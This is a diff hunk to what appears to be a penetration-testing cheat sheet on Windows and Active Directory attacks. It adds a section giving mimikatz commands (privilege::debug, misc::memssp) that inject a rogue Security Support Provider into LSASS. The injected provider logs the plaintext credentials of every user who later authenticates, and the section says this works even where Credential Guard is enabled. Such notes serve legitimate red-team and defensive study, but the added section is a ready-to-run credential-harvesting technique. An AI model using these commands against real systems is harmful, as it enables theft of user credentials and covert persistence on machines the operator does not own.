@@ -3365,6 +3365,15 @@ klist
 dir \\<RHOST>\admin$
 ```
 
+##### Patch LSASS by injecting a new Security Support Provider
+```cmd
+.\mimikatz.exe
+privilege::debug
+misc::memssp
+```
+Then the credentials of all the users authenticating after the injection will be logged. It can also be utilised when [Credential Guard](https://docs.microsoft.com/en-us/windows/security/identity-protection/credential-guard/credential-guard-manage) is configured.
+When a user authenticates again, the credentials will be saved to `C:\Windows\System32\mimilsa.log`.
+
 ##### Skeleton Key
 
 ```cmd
